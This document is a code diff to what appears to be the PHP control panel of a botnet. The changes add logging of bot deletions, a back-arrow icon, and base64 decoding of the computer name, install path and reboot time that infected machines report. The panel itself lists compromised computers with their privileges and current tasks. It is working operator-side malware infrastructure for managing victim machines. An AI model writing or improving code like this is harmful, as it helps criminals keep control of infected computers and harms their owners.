@@ -116,6 +116,8 @@ $gi = geoip_open("inc/geo/GeoIP.dat", "");
 							{
 								$del = $odb->prepare("DELETE FROM bots WHERE id = :id LIMIT 1");
 								$del->execute(array(":id" => $_GET['id']));
+								$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
+								$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted bot #'.$_GET['id']));
 								echo '<div class="alert alert-success">Bot deleted successfully. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
 								die();
 							}
@@ -138,7 +140,7 @@ $gi = geoip_open("inc/geo/GeoIP.dat", "");
 					</div>
 					<div class="col-lg-3 col-xs-6"></div>
 					<div class="col-lg-6 col-xs-12">
-						<center><a href="?p=bots">Go back</a></center><br>
+						<center><a href="?p=bots"><i class="fa fa-arrow-left"></i> Go back</a></center><br>
 						<table class="table table-condensed table-hover table-striped table-bordered">
 							<thead>
 								<tr>
@@ -159,11 +161,11 @@ $gi = geoip_open("inc/geo/GeoIP.dat", "");
 								<tr><td>Install Date</td><td><?php echo date("m-d-Y, h:i A", $d['installdate']); ?></td></tr>
 								<tr><td>Last Response</td><td><?php echo date("m-d-Y, h:i A", $d['lastresponse']); ?></td></tr>
 								<tr><td>Current Task</td><td>#<?php echo $d['currenttask']; ?></td></tr>
-								<tr><td>Computer Name</td><td><?php echo $d['computername']; ?></td></tr>
+								<tr><td>Computer Name</td><td><?php echo base64_decode($d['computername']); ?></td></tr>
 								<tr><td>Operating System</td><td><?php echo $d['operatingsys']; ?></td></tr>
 								<tr><td>Privileges</td><td><?php echo $d['privileges']; ?></td></tr>
-								<tr><td>Installation Path</td><td><?php echo $d['installationpath']; ?></td></tr>
-								<tr><td>Last Reboot</td><td><?php echo $d['lastreboot']; ?></td></tr>
+								<tr><td>Installation Path</td><td><?php echo base64_decode($d['installationpath']); ?></td></tr>
+								<tr><td>Last Reboot</td><td><?php echo base64_decode($d['lastreboot']); ?></td></tr>
 								<tr><td>Bot Version</td><td><?php echo $d['botversion']; ?></td></tr>
 							</tbody>
 						</table>
